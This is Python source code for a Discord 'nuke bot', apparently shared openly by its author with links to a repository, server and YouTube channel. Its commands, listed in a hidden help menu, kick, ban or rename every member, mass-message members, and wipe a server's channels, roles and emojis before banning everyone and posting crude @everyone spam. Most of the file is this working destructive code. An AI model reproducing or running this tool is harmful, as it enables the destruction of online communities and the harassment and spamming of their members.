#Made by Social404
from config import prefix
from config import token
import keep_alive
import discord
from discord.ext import commands
from discord.ext.commands import bot
import asyncio
import time
import random
import os
intents = discord.Intents(messages=True, guilds=True, members=True)
# Imports the needed libs.

client = commands.Bot(command_prefix=prefix, intents=intents)
# Sets prefix and intents

client.remove_command("help")

@client.event
async def on_ready():
    print ("Ah shit, here we go again")

@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))

####HELP COMMAND####
@client.command(pass_context=True)
async def secret(ctx):
    await ctx.message.delete()
    member = ctx.message.author

    embed = discord.Embed(
        colour = discord.Colour.blue()
    )

    embed.set_author(name='Secret')
    embed.add_field(name='Kall', value='Kicks every member in a server', inline=False)
    embed.add_field(name='Ball', value='Bans every member in a server', inline=False)
    embed.add_field(name='Rall', value='Renames every member in a server', inline=False)
    embed.add_field(name='Mall', value='Messages every member in a server', inline=False)
    embed.add_field(name='Destroy', value='Deleted channels, remakes new ones, deletes roles, bans members, and wipes emojis. In that order', inline=False)
    embed.add_field(name='Ping', value='Gives ping to client (expressed in MS)', inline=False)
    embed.add_field(name='Info', value='Gives information of a user', inline=False)
    await member.send(embed=embed)
#############################

####KALL COMMAND####
@client.command(pass_context=True)
async def kall(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.kick(member)
            print (f"{member.name} has been kicked")
        except:
            print (f"{member.name} has FAILED to be kicked")
        print ("Action completed: Kick all")
#############################

####BALL COMMAND####
@client.command(pass_context=True)
async def ball(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    print ("Action completed: Ban all")
#############################

####RALL COMMAND####
@client.command(pass_context=True)

async def rall(ctx, rename_to):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        try:
            await member.edit(nick=rename_to)
            print (f"{member.name} has been renamed to {rename_to}")
        except:
            print (f"{member.name} has NOT been renamed")
        print("Action completed: Rename all")
#############################

####MALL COMMAND####
@client.command(pass_context=True)
async def mall(ctx):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        await asyncio.sleep(0)
        try:
            embed = discord.Embed(title="This Is Why You Dont Wanna Give Random People Admin!", url="https://github.com/Social404/Advanced-Discord-Nuke-Bot", description="They Nuke Your Server With A Free Source Code (Click The Text Above For The Code)" , color=discord.Colour.purple())
            embed.add_field(
                name="Discord Server",
                value=
                "[ [ Click here ] ](https://discord.gg/kE9vk9Zeuf)",
                inline=False)
            embed.add_field(
                name="Youtube Channel",
                value=
                "[ [ Click here ] ](https://www.youtube.com/channel/UCXk0klxbjcVgGvYyKWLgtLg)",
                inline=False)
            embed.add_field(
                name="GitHub",
                value=
                "[ [ Click here ] ](https://github.com/social404)",
                inline=False)
            embed.set_thumbnail(url="https://tenor.com/view/destory-eexplode-nuke-gif-6073338")
            embed.set_footer(text="Nuked By Social404's Bot! Sorry About Your Loss")
            await member.send(embed=embed)
        except:
            pass
        print("Action completed: Message all")
#############################

###DESTROY COMMAND####
@client.command(pass_context=True)
async def destroy(ctx):
    await ctx.message.delete()
    for member in list(client.get_all_members()): 
        await asyncio.sleep(0)
        try:
            embed = discord.Embed(title="This Is Why You Dont Wanna Give Random People Admin!", url="https://github.com/Social404/Advanced-Discord-Nuke-Bot", description="They Nuke Your Server With A Free Source Code (Click The Text Above For The Code)" , color=discord.Colour.purple())
            embed.add_field(
                name="Discord Server",
                value=
                "[ [ Click here ] ](https://discord.gg/kE9vk9Zeuf)",
                inline=False)
            embed.add_field(
                name="Youtube Channel",
                value=
                "[ [ Click here ] ](https://www.youtube.com/channel/UCXk0klxbjcVgGvYyKWLgtLg)",
                inline=False)
            embed.add_field(
                name="GitHub",
                value=
                "[ [ Click here ] ](https://github.com/social404)",
                inline=False)
            embed.set_thumbnail(url="https://tenor.com/view/destory-eexplode-nuke-gif-6073338")
            embed.set_footer(text="Nuked By Social404's Bot! Sorry About Your Loss")
            await member.send(embed=embed)
        except:
            pass
        print("Action completed: Message all")
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print (channel.name + " has been deleted")
        except:
            pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel("Daboss ki MKC")
        await channel.send(" @everyone daboss ki gand me 2 packet bidi...")
        await channel.send(embed=embed)
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted")
        except:
            pass
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"{emoji.name} has been deleted")
        except:
            pass    
    print("Action completed: Nuclear Destruction")
#############################


####PING COMMAND####
@client.command(pass_context=True)
async def ping(ctx):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    t1 = time.perf_counter()
    await channel.trigger_typing()
    t2 = time.perf_counter()
    embed=discord.Embed(title=None, description='Ping: {}'.format(round((t2-t1)*1000)), color=0x2874A6)
    await member.send(embed=embed)
    print("Action completed: Server ping")
#############################

####INFO COMMAND####
@client.command(pass_context=True)
async def info(ctx, member: discord.Member=None):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    if member is None:
        pass
    else:
        await channel.send("**The user's name is: {}**".format(member.name) + "\n**The user's ID is: {}**".format(member.id) + "\n**The user's current status is: {}**".format(member.status) + "\n**The user's highest role is: {}**".format(member.top_role) + "\n**The user joined at: {}**".format(member.joined_at))
    print("Action completed: User Info")
#############################


keep_alive.keep_alive()


client.run(token)
# Place your Bot's token here
